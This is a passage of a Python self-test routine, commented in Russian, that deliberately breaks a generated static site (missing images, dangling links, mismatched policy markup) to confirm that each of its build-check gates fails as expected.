    ]

    breaks += [
        ("каждая объявленная несущая сканируется", _break_carrier_blind),
        ("каждая объявленная несущая сканируется", _break_carrier_kind),
        ("каждая объявленная несущая сканируется", _break_carrier_empty),
        ("свой ресурс существует",
         _inject('<img src="/no-such-file.png">')),
        ("свой ресурс существует",
         _inject('<video poster="/no-such-poster.jpg"></video>')),
        # Пустая выкладка, а не «выкладка без страниц»: карта сайта и
        # robots держали бы выборку непустой, и поломка тихо перестала бы
        # ломать — самопроверка поймала это на предыдущем прогоне.
        ("свой ресурс существует", _strip_all),
        ("политика совпадает с разметкой", _break_policy_pixel),
        ("политика совпадает с разметкой", _break_policy_ways),
        ("политика совпадает с разметкой", _break_policy_kinds),
        ("политика совпадает с разметкой", _break_policy_quotes),
        # Ссылка в никуда, записанная ОДИНАРНЫМИ кавычками: браузер идёт по
        # ней ровно так же, а прежняя регулярка её не видела.
        ("внутренние ссылки ведут на существующее",
         _inject("<a href='/no-such-page-2/'>x</a>")),
        # Слово о последствии переехало на витрину. Гейт читал только
        # страницы товара и промолчал бы — это записанный урок фермы.
        ("вердикт выведен из еды, а не из папки",
         lambda c: c.__setitem__("all/index.html", c["all/index.html"].replace(
             "</body>", '<div class="means">%s</div></body>'
             % pr.MEANS_CHIP["safety"], 1))),
    ]

    assert {n for n, _ in breaks} == {n for n, _ in GATES}, (

        "поломки и гейты не совпадают по именам")
    assert len(GATES) == GATE_COUNT

    ok = pure_selftest()
    ok = stamp_selftest() and ok
    for name, fn in breaks:
        gate = dict(GATES)[name]
        try:
            result = gate(broken(fn))
        finally:
            _restore_all()
        lab = getattr(fn, "label", "") or (fn.__doc__ or "").strip().split(
            "\n")[0][:64]
        lab = (" · " + lab) if lab else ""
        if not result:
            print("  ГЕЙТ НЕ СРАБОТАЛ  %s%s" % (name, lab))
            ok = False
        else:
            print("  краснеет          %s%s" % (name, lab))
    return 0 if ok else 1


if __name__ == "__main__":
    sys.stdout.reconfigure(encoding="utf-8")
    if "--selftest" in sys.argv:
        sys.exit(selftest())
    import render as rd
    files, _s, _a = rd.assemble()
    failed = run(files)
    stale = stamp(files, rd.CONTENT_DATE)
    if stale:
        print("  ПРОВАЛ  дата содержимого")
        print("          %s" % stale)
        failed += 1
    else:
        print("  пройден дата содержимого совпадает с содержимым")
    sys.exit(1 if failed else 0)
